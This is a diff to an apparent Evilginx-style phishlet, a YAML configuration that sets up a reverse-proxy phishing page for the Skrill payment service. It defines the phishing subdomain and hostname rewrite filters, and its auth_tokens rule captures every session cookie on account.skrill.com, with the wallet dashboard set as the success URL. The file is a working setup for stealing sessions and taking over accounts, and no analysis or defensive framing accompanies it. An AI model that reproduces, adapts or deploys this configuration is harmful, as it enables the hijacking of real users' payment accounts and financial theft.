@@ -2,15 +2,12 @@ name: 'skrill'
 author: '@moi'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'account', orig_sub: 'account', domain: 'skrill.com', session: true, is_landing: true}
-  - {phish_sub: '', orig_sub: '', domain: 'skrill.com', session: true, is_landing: false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'skrill.com', session: true, is_landing: true, auto_filter: true}
 sub_filters:
-  - {triggers_on: 'account.skrill.com', orig_sub: 'www', domain: 'skrill.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname__regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'account.skrill.com', orig_sub: 'www', domain: 'skrill.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'skrill.com', orig_sub: 'account', domain: 'skrill.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname__regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'skrill.com', orig_sub: 'account', domain: 'skrill.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 auth_tokens:
-  - domain: '.skrill.com'
-    keys: ['.*,regexp']
-  - domain: 'account.skrill.com'
+  - domain: '.account.skrill.com'
     keys: ['.*,regexp']
 auth_urls: 
  - 'wallet/ng/dashboard'
